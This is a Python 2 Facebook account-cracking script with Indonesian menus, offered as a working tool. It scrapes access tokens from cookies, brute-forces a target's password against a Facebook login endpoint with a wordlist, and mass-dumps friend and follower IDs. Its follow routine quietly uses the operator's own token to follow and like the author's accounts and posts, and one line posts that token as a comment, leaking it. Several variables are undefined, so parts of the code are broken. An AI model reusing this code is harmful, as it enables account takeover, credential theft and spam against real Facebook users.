#*-coding:utf-8-*
import os, sys, re, time, json, requests, random, datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

"""

"""

# Warna
H = ('\x1b[0;97m')
M = ('\x1b[0;97m')
H = ('\x1b[1;92m')
K = ('\x1b[1;91m')
T = ('\x1b[1;93m')
U = ('\x1b[1;94m')
B = ('\x1b[1;95m')
P = ('\x1b[0;97m')

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
# menu loading masuk sc
print ("\x1b[1;92mloading......")
print "•••"
time.sleep(2)
print "•••••"
time.sleep(3)
print "••••••••"
time.sleep(4)
print "••••••••••••"
time.sleep(5)
print "••••••••••••••••"
time.sleep(6)
print " \x1b[1;92mSukses "
time.sleep(5)
print " Mao join grup admin "
os.system("xdg-open https://chat.whatsapp.com/HKBonl0ldcX5cCG6P8FeEM")

#coding=utf-8
#import sys,os,requests,time,json,uuid

___logo___ = ("""\x1b[0;97m███████╗██╗██████╗\n██╔════╝██║██╔══██╗\n█████╗  ██\033[0;36m║██████╔╝\n██╔══╝  ██║██╔══██╗\n██║ \x1b[1;94m    ██║██║  ██║\n╚═╝     ╚═╝╚═╝  ╚═╝\n\x1b[1;97m╔════════════════════╗\n °TOOL NAME• BVC  \033[0;36m      \n °AUTHOR   • BVC•FIR        \n °GITHUB   • FIR88     \n╚════════════════════╝""")

# Penampung
loop = 0
ok = []
cp = []

# Login
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s1%s]%s Login Wih Token"%(B,P,B,P))
    print("%s[%s2%s]%s Login With Cookie"%(B,P,B,P))
    print("%s[%s3%s]%s Dapatkan Token Or Cookie"%(B,P,B,P))
    print("%s[%s4%s]%s Keluar"%(K,P,K,P))
    ___login___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ___token___ = raw_input("%s[%s?%s]%s Token :%s "%(B,P,B,P,K))
            if ___token___ in ['',' ']:
                exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
            xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
            print("%s[%s*%s]%s Halo TOd :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
            open('login.txt','w').write(___token___)
            ___follow___()
        except (KeyError):
            exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    elif ___login___ in ['2','02']:
        try:
            ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
            if ___cookie___ in ['',' ']:
                exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
            # Terimakasih untuk dullah!
            data = requests.get('https://business.facebook.com/business_locations', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
                'referer'                   : 'https://www.facebook.com/',
                'host'                      : 'business.facebook.com',
                'origin'                    : 'https://business.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
            }, cookies = {
                'cookie'                    : ___cookie___
            })
            find_token = re.search('(EAAG\w+)', data.text)
            if find_token is None:
                exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
            open('login.txt','w').write(find_token.group(1))
            try:
                xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(find_token.group(1))).json()
                print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
                ___follow___()
            except (KeyError):
                exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (AttributeError,UnboundLocalError):
            exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    elif ___login___ in ['3','03']:
        print("%s[%s?%s]%s Anda Akan Di Arahkan Ke Youtube Atau Browser"%(B,H,B,P));sleep(2)
        os.system('xdg-open https://chat.whatsapp.com/HKBonl0ldcX5cCG6P8FeEM')
        exit("%s[%s!%s]%s Ketik ulang %sÂ«%spython2 dump.py%sÂ»"%(B,K,B,P,H,P,H))
    elif ___login___ in ['4','04']:
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Bot Follow
def ___follow___():
    try:
        ___token___ = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        web = datetime.datetime.now()
        ___waktu___ = web.strftime("%H:%M:%S/%d-%m-%Y")
        ___hour___ = web.hour
        if 06 <= ___hour___ < 11:
            ___ucapkan___ = ('Selamat Pagi ðŸ’™')
        elif 11 <= ___hour___ < 15:
            ___ucapkan___ = ('Selamat Siang ðŸ’›')
        elif 15 <= ___hour___ < 18:
            ___ucapkan___ = ('Selamat Sore ðŸ§¡')
        else:
            ___ucapkan___ = ('Selamat Malam ðŸ–¤')
        ___kata___ = random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
        ___komen___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        ___komen2___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___))
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___))
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___))
        post = '573457507083491'
    	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + toket)
    	requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + toket)
    	requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + toket)
    	menu()
    except:
        exit("%s[%s!%s]%s Login berhasil"%(P,M,P,M))
    print("%s[%s*%s]%s Login Berhasil"%(H,P,H,P))
    ___menu___()
# Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        xoz = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
        print ("\x1b[1;94mTol ini Baru Saya Buat\nJadi Banyak Bug dan eror\n")
        print ("\x1b[1;96m•_______________fir________________•")
        print("%s[%sf%s]%s Welcome :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
            print("%s[%sf%s]%s Email :%s %s"%(B,P,B,P,H,xoz['email']))
        except:
            print("%s[%sf%s]%s Versi :%s v.1"%(B,P,B,P,H))
        print("%s[%sf%s]%s User :%s %s"%(B,P,B,P,H,xoz['id']))
    except (KeyError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2);os.system('rm - rf login.txt')
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,M,P,M))
    print ("•_______________fir________________•\n")
    print("%s[%s01%s]••>%s Dump ID Publik Old v1 \x1b[1;91m •\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s02%s]••>%s Dump ID Publik  Old v2 \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s03%s]••>%s Dump ID Publik  New    \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s04%s]••>%s Dump ID Publik Very Old\x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s05%s]••>%s Dump ID Follower Old   \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s06%s]••>%s Dump ID Follower New   \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s07%s]••>%s Dump ID Publik Id      \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s08%s]••>%s Dump ID Publik Old     \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s09%s]••>%s Dump ID Publik New     \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s10%s]%s Start Crack %s[%sFir%s/%sara%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s11%s]••>%s Lihat Hasil Crack      \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s12%s]••>%s Join Grup wa           \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s13%s]••>%s Hapus Token            \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s14%s]••>%s Dump ID Masal Brutal   \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print("%s[%s15%s]••>%s Mode Target :v         \x1b[1;91m•\x1b[1;92m•"%(H,U,H,P))
    print ("•_______________fir________________•")
    ___menu___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___menu___ in ['1','01']:
        ___masal___()
    elif ___menu___ in ['2','02']:
        ___masal2___()
    elif ___menu___ in ['14','014']:
        ___firmasal__()
    elif ___menu___ in ['of','of']:
        ___fir__()
    elif ___menu___ in ['of','of']:
        ___ara__()
    elif ___menu___ in ['of','of']:
        ___fir88__()
    elif ___menu___ in ['of','of']:
        ___anjing__()
    elif ___menu___ in ['of','of']:
        ___anjing8__()
    elif ___menu___ in ['15','015']:
        ___anjing0__()
    elif ___menu___ in ['of','021']:
        ___anjingfir__()
    elif ___menu___ in ['of','of']:
        ___firbo__()
    elif ___menu___ in ['of','of']:
        ___firbot__()
    elif ___menu___ in ['of','of']:
        ___firddos__()
    elif ___menu___ in ['3','03']:
        ___masal3___()
    elif ___menu___ in ['4','04']:
        ___very___()
    elif ___menu___ in ['5','05']:
        ___follower___()
    elif ___menu___ in ['6','06']:
        ___follower2___()
    elif ___menu___ in ['7','07']:
        ___acak___()
    elif ___menu___ in ['8','08']:
        ___old___()
    elif ___menu___ in ['9','09']:
        ___new___()
    elif ___menu___ in ['10']:  #os.system('rm -rf data/token.txt && rm -rf data/cookies')
        ___metode___()
    elif ___menu___ in ['11']:
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        print("\n%s[%s1%s]%s Lihat Máhdi Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Máhdi Cp.txt"%(B,P,B,P))
        print("%s[%s3%s]%s Kembali"%(B,K,B,P))
        ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___hasilz___ in ['1','01']:
            try:
                ___ok___ = open('Results/Ok.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s fir Ok.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total fir Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s fir Cp.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total fir Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        elif ___hasilz___ in ['3','03']:
            ___menu___()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['12']:
        print("%s[%s*%s]%s IF you COntact ME My Fb"%(B,P,B,P));sleep(2)
        os.system("xdg-open https://chat.whatsapp.com/HKBonl0ldcX5cCG6P8FeEM")
        exit()
    elif ___menu___ in ['13']:
        os.system('rm -rf login.txt')
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(H,U,H,P))

def ___firbot__():
#    os.system('clear')
    try:
        toket = open('login/token.txt', 'r').read()
    except IOError:
#        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Token modar ")
        os.system('rm -rf data/token.txt')
        time.sleep(1)
#        masuk()

#    os.system('clear')
 ##   print logo
   # print 52 * '\x1b[1;97m\xe2\x95\x90'
    print("\033[0;36m[\033[0;00m+\033[0;36m Menu bot facebook ")
    print("\n\033[0;36m[\033[0;00m01\033[0;36m]\033[0;00m Bot reactiont target post")
    print("\033[0;36m[\033[0;00m02\033[0;36m]\033[0;00m Bot reactiont group post")
    print("\033[0;36m[\033[0;00m03\033[0;36m]\033[0;00m Bot komen target post")
    print("\033[0;36m[\033[0;00m04\033[0;36m]\033[0;00m Bot komen group post")
    print("\033[0;36m[\033[0;00m05\033[0;36m]\033[0;00m Mass delet post")
    print("\033[0;36m[\033[0;00m06\033[0;36m]\033[0;00m Trima permintaan pertemanan")
    print("\033[0;36m[\033[0;00m07\033[0;36m]\033[0;00m Hapus pertemanan")
    print("\033[0;36m[\033[0;00m00\033[0;36m]\033[0;00m Kembali ke menu")
    bot_pilih()


def bot_pilih():
    bots = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Input : ")
    if bots == '':
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jangan kosong")
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()



#### CRACK MASSAL #### 
def ___anjing0__():
	global toket
	try:
		toket=open('login/token.txt','r').read()
	except IOError:
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf login/token.txt')
#		login()
	os.system('clear')
#	print logo
	print("\033[0;96m"+50*"•")
	try:
		print ("••jika ingin mengunakan Wordlst Bawahan Sc ketik fir.txt••")
		email = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET: ")
		passw = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Wordlist: ")
		total = open(passw,"r")
		total = total.readlines()
		time.sleep(1)
		print("\033[0;96m"+50*"•")
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET : "+email
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total Password : "+str(len(total))
		time.sleep(1)
		print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack Started...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Check Pass Valid : "+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("ok.txt", "w")
					dapat.write(email+"|"+pw+"\n")
					dapat.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT SUCCES [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : ok.txt")
					raw_input(" [BACK]")
					menu()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("cp.txt", "w")
					ceks.write(email+"|"+pw+"\n")
					ceks.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT CHECKPOINT [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : cp.txt")
					raw_input(" [BACK]")
					menu()
			except requests.exceptions.ConnectionError:
				print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] File Wordlist Tidak Di Temukan")
		time.sleep(2)
		menu()
#belom di pasang mls:v
def ___anjing8__():
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Dump id postingan :)")
        idt = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Id post : ")
        simpan = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama buat file : ")
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,firganteng))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        firganteng = open(file, 'w')
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
#            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id --> \033[0;36m%s"%(str(len(id))))
            sys.stdout.flush();jeda(0.0050)

        firganteng.close()
#        print ('\n\n%s[%s+%s]%s Succes Dump Id Postingamln '%(B,J,B,P,))
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File.tersimpan di --> \033[0;36m%s"%(file))
        raw_input("\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        menu()
    except Exception as e:
        firganteng("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Kemungkinan akun mati / id tersebut tidak di publikan");exit()
# belom di pasang mls
def ___anjing__():
    try:
        firganteng = open('login/token.txt','r').read()
    except (IOError):
        print("[+] Paatikan Id wajib Follower")
    try:
        ___ids___ = raw_input("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User id : ")
        if ___ids___ in ['',' ']:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jangan kosong");exit()
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,firganteng)).json()
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Nama : %s "%(oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User tidak ada");exit()
    try:
        rex = requests.get("https://graph.facebook.com/%s/subscribers?access_token=%s&limit=9999999"%(___ids___,firganteng)).json()
        file = open(___file___ , 'a')
        for a in rex['data']:
            if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id •> \033[0;36m%s "%(len(id))),
            elif a['id'][:10] in ['1000000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id •> \033[0;36m%s "%(len(id))),
            elif a['id'][:9] in ['100000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id •> \033[0;36m%s "%(len(id))),
            elif a['id'][:8] in ['10000000']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            elif a['id'][:6] in ['100001','100002','100003','100004','100005','100006','100007','100008','100009']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id : %s "%(len(___user___)))
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di : %s"%(___file___))
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()
    except (KeyError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Dump gagal");exit()
    except (ConnectionError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Koneksi eror");exit()
# belom di pasang mls v:
def ___fir88__():
    try:
        firganteng = open('login/token.txt','r').read()
    except (IOError):
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Token modar dinggo wae");exit()
    try:
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Mau dump berapa id")
        ___total___ = int(raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jumlah id : "))
    except:
        ___total___ = 1
    ___file___ = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Buat file : ")
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User id \033[0;33m%s : "%(zx))
        print(" ")
        if ___ids___ in ['',' ']:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jangan kosong");exit()
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,jeeckxd)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:10] in ['1000000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:9] in ['100000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:8] in ['10000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Mengumpulkan id --> \033[0;36m%s "%(len(id))),
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id : %s "%(len(___user___)))
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m File tersimpan di : %s "%(___file___))
            raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]");menu()
        except (KeyError):
            fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Dump gagal");exit()
        except (ConnectionError):
            fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Koneksi eror");exit()

# belom di pasang mls
def ___ara__():
    try:
        fir88xd = open('login.txt','r').read()
    except (IOError):
        fir88("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Token modar dinggo wae");exit()
    try:
        fir88("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Mau dump berapa id : ")
        ___total___ = int(raw_inpyut("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jumlah id : "))
    except:
        ___total___ = 1
    ___file___ = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Buat file : ")
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m User id \033[0;33m%s : "%(zx))
        print(" ")
        if ___ids___ in ['',' ']:
            print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Jangan kosong");exit()
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,jeeckxd)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if a['id'][:5] in ['10005','10006','10007','10008']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\n\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Total id : %s "%(len(___user___)))
